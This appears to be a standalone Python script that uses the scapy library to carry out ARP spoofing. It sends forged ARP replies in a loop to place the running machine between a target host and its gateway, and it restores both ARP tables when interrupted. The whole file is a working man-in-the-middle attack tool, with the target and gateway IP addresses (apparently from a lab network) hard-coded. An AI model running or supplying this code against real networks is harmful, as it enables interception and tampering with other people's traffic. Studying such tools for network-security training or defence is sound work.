#!/usr/bin/python3
import scapy.all as scapy
import time


# get the mac address of the specified target
def get_mac(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = broadcast / arp
    answered_list = scapy.srp(arp_request, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# spoof functions which "fools" the target ip address that the computer is the router
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    return scapy.send(packet, verbose=False)


# restores the original destination of the gateway_ip(router IP) and the target_ip
def restore_destination(ip_target, ip_spoof):
    target_mac = get_mac(ip_target)
    ip_spoof_mac = get_mac(ip_spoof)
    packet = scapy.ARP(op=2, pdst=ip_target, hwdst=target_mac, psrc=ip_spoof, hwsrc=ip_spoof_mac)
    return scapy.send(packet, verbose=False)


sent_packets = 0
while True:
    try:
        spoof('10.0.2.14', '10.0.2.1')
        spoof('10.0.2.1', '10.0.2.14')
        sent_packets += 2
        print("\r[+]Packets sent " + str(sent_packets), end="")
        time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-]Quitting ARP_SPOOF program....Restoring ARP tables...")
        restore_destination('10.0.2.14', '10.0.2.1')
        restore_destination('10.0.2.1', '10.0.2.14')
        exit()
